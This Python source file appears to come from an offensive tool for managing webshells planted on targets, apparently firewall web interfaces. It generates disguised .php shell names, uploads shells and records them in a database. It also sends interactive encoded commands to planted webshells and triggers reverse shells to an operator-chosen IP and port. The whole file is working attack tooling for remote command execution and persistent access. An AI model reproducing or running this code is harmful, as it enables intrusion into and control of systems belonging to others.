import Commands
import Utils.Database
import Utils.Login as Login
from Utils.Web import simple_get, simple_post

import urllib
from random import choice as rchoice
from base64 import b64encode
from collections import namedtuple
from termcolor import cprint
import traceback

class Shells():
    def __init__(self, loginSession):
        self.dbConn = Utils.Database()
        self.loginSession = loginSession
        self.DEBUG = False


    def create_shellname(self, wordlist:str, amt:int) -> str:
        shellname = ""

        ######################## IMPLEMENT A CHECK TO MAKE SURE ITS NOT A REAL FILE
        with open(wordlist, 'r') as filehandle:
            lines = filehandle.readlines()

            for word in range(amt):
                shellname += rchoice(lines).strip() + "_"

        # Remove trailing _
        shellname = shellname[:-1] + ".php"

        return shellname


    def access_webshell(self, shellId:str) -> None:
        cmd = b""
        path = ""
        encoding = "utf-8"
        b64_exit = b64encode("quit".encode("ascii"))

        shellTuple = namedtuple("shell", ["name", "url", "filepath", "level", "cmd"])

        # Obtain current shell to be accessed and add to a named tuple
        row = self.dbConn.get_row("webshells", "id", shellId)
        activeShell = shellTuple(name=row[1], url=row[2], filepath=row[3], level=row[4], cmd=row[5])

        # THIS IS THE SAME CURRENT SO I CAN MAYBE CHANGE IT TO GET/POST
        if(activeShell.level == "skidy"):
            path = activeShell.filepath + "?" + activeShell.cmd + "="
        elif(activeShell.level == "amateur"):
            path = activeShell.filepath + "?" + activeShell.cmd + "="
        elif(activeShell.level == "pro"):
            path = activeShell.filepath

        ## Stop logging into the site
        self.loginSession = Login.Login(activeShell.name, activeShell.url, attemptLogin=False)

        while(cmd.decode(encoding).lower() != "quit"):
            # Type 'quit' to exit
            cprint("Type '", "green", end="")
            cprint("quit", "yellow", end="")
            cprint("' to exit", "green")
            cprint(f"{activeShell.level.capitalize()} CMD: ", "blue", end="")
            cmd = input().encode("ascii")

            if(activeShell.level != "skidy"):
                cmd = b64encode(cmd)

            # Checks for quit
            if(cmd == "quit".encode("ascii") or cmd == b64_exit): return

            cmd_encoded = urllib.parse.quote_plus(cmd)
            if(activeShell.level == "pro"):
                data = activeShell.cmd + "=" + cmd_encoded
                simple_post(self.loginSession, path, data, 2)
            else:
                simple_get(self.loginSession, path, cmd_encoded, 1)


    def access_revshell(self, shellId:str) -> None:
        # Listening IP: 
        cprint("Listening IP", "blue", end="")
        cprint(": ", "white", end="")
        ip = input()
        # Listening Port: 
        cprint("Listening Port", "blue", end="")
        cprint(": ", "white", end="")
        port = input()

        conConcat = f"{ip} {port}"
        conConcatB64 = b64encode(conConcat.encode("ascii"))
        ip_port = urllib.parse.quote_plus(conConcatB64)

        shellTuple = namedtuple("shell", ["name", "url", "filepath", "level", "cmd"])

        # Obtain current shell to be accessed and add to a named tuple
        row = self.dbConn.get_row("revshells", "id", shellId)
        activeShell = shellTuple(name=row[1], url=row[2], filepath=row[3], level=row[4], cmd=row[5])

        ## Stop logging into the site
        self.loginSession = Login.Login(activeShell.name, activeShell.url, attemptLogin=False)

        if(activeShell.level == "skidy"):
            path = activeShell.filepath 
            variables = "?ip=" + ip + "&port=" + port
            simple_get(self.loginSession, path, variables, 3)
        elif(activeShell.level == "amateur"):
            path = activeShell.filepath + f"?{activeShell.cmd}="
            simple_get(self.loginSession, path, ip_port, 3)
        elif(activeShell.level == "pro"):
            path = activeShell.filepath
            data = f"route={ip_port}"
            simple_post(self.loginSession, path, data, 3)




    def send_shell(self, web_cmd:str, filename:str, level:str, shell_param:str, shellType:str) -> None:
        try:
            Commands.cmd_GET(self.loginSession, web_cmd, 0)
            
            #################################### MOVE TO NEW METHOD
            # Add new WebShell to DB
            # Name of firewall, url, filename, type of shell, malicious param
            self.dbConn = Utils.Database()

            data = [self.loginSession.target_name]
            data.append(self.loginSession.targetUrl)
            data.append(filename)
            data.append(level)
            data.append(shell_param)

            if(self.DEBUG): print(f"Data: {data}")
            if(self.DEBUG): print(f"ShellType {shellType}")

            # Sql yeah
            self.dbConn.set_shell(data, shellType)
            cprint("Upload Complete!", "green")
        except:
            if(self.DEBUG): print(traceback.print_exc())
            cprint("Upload failed", "red")